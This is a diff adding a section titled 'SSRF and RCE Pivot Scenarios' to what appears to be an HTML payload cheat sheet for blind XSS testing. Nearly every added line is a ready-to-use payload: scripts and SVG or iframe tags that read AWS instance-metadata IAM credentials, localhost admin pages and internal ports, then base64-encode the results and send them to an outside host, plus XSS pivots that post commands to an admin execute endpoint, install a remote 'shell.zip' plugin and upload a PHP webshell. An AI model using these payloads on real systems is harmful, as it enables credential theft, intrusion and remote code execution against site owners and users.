@@ -376,3 +376,139 @@ Image tag with shopimg.png
 Image tag with /img.png path
 <br>
 '"><img src="https://1.hackeronce.com/img.png">
+
+<br><hr><br>
+
+<h3>SSRF and RCE Pivot Scenarios</h3>
+
+Blind XSS → Client-Side SSRF (Exfiltration via iframe)
+<br>
+'"><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
+
+<br><br>
+
+Blind XSS → Client-Side SSRF (Exfiltration via fetch)
+<br>
+<script>
+fetch("http://169.254.169.254/latest/meta-data/")
+.then(r=>r.text())
+.then(d=>fetch("https://1.hackeronce.com/?data="+btoa(d)))
+</script>
+
+<br><br>
+
+Script payload → SSRF (Original)
+<br>
+'"><script src="https://1.hackeronce.com/moovit"></script>
+
+<br><br>
+
+Script payload → SSRF (Internal probing)
+<br>
+'"><script>
+fetch("http://127.0.0.1:8080")
+</script>
+
+<br><br>
+
+Script payload → SSRF (Internal API discovery)
+<br>
+'"><script>
+fetch("http://localhost/admin")
+.then(r=>r.text())
+.then(d=>fetch("https://1.hackeronce.com/?admin="+btoa(d)))
+</script>
+
+<br><br>
+
+javascript:fetch payload → SSRF pivot (Internal service access)
+<br>
+javascript:fetch('http://127.0.0.1:8080')
+.then(r=>r.text())
+.then(d=>fetch('https://1.hackeronce.com/?data='+btoa(d)))
+
+<br><br>
+
+javascript:fetch payload → SSRF pivot (AWS metadata SSRF)
+<br>
+javascript:fetch('http://169.254.169.254/latest/meta-data/')
+.then(r=>r.text())
+.then(d=>fetch('https://1.hackeronce.com/?aws='+btoa(d)))
+
+<br><br>
+
+SSTI gadget → SSRF pivot (Internal network access)
+<br>
+{{constructor.constructor("fetch('http://127.0.0.1:8080').then(r=>r.text()).then(d=>fetch('https://1.hackeronce.com/?d='+btoa(d)))")()}}
+
+<br><br>
+
+SSTI gadget → SSRF pivot (AWS metadata)
+<br>
+{{constructor.constructor("fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(d=>fetch('https://1.hackeronce.com/?aws='+btoa(d)))")()}}
+
+<br><br>
+
+SVG payload → SSRF (Internal admin API dump)
+<br>
+'"><svg onload="fetch('http://localhost/admin')
+.then(r=>r.text())
+.then(d=>fetch('https://1.hackeronce.com/?admin='+btoa(d)))"></svg>
+
+<br><br>
+
+XSS → RCE pivot (XSS → admin API → command execution)
+<br>
+<script>
+fetch("/admin/execute",{
+method:"POST",
+credentials:"include",
+body:"cmd=id"
+})
+</script>
+
+<br><br>
+
+XSS → RCE pivot (XSS → plugin install → RCE)
+<br>
+<script>
+fetch("/admin/plugins/install",{
+method:"POST",
+credentials:"include",
+body:"url=https://1.hackeronce.com/shell.zip"
+})
+</script>
+
+<br><br>
+
+XSS → RCE pivot (XSS → file upload → webshell)
+<br>
+<script>
+var fd=new FormData();
+fd.append("file",new Blob(["<?php system($_GET['cmd']);?>"],{type:"application/x-php"}),"shell.php");
+fetch("/admin/upload",{method:"POST",body:fd,credentials:"include"});
+</script>
+
+<br><br>
+
+Loader payload (x.js)
+<br>
+"><script src=https://1.hackeronce.com/x.js></script>
+
+<br><br>
+
+Iframe SSRF probe (Port 61924)
+<br>
+"><iframe src="http://127.0.0.1:61924/" onload="fetch('https://1.hackeronce.com/log?ok=1')"></iframe>
+
+<br><br>
+
+Iframe LFI probe (/etc/passwd)
+<br>
+"><iframe src="file:///etc/passwd" onload="fetch('https://1.hackeronce.com/etc?passwd=1')"></iframe>
+
+<br><br>
+
+Iframe SSRF probe (Port 62085)
+<br>
+"><iframe src="http://127.0.0.1:62085/" onload="fetch('https://1.hackeronce.com/log?ok=1')"></iframe>
